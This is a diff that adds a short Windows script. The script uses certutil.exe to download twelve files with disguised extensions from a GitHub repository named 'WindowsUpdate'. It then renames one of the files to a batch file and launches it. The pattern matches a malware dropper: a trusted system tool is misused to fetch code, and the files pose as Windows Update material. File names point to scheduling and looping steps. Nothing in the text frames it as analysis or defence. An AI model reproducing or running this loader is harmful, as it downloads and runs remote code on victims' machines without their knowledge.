@@ -1,0 +1,24 @@
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/MiCert.uiaq" MiCert.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/MiCertIII.uiaq" MiCertIII.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/2dir.uiaq" 2dir.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/3cpy.uiaq" 3cpy.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/4sch.uiaq" 4sch.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/5re.uiaq" 5re.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/6pylooper.uiaq" 6pylooper.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/6pylooper.altp" 6pylooper.altp
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/7looper.uiaq" 7looper.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/7looper.altp" 7looper.altp
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/8opfile.uiaq" 8opfile.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/up-query.altp" up-query.altp
+
+if (!(Test-Path "C:\Users\Public\MiCertIII.uiaq"))
+{
+	echo "not found"
+	exit
+}
+else
+{
+	ren MiCertIII.uiaq MiCertIII.bat
+	start .\MiCertIII.bat
+}
+exit
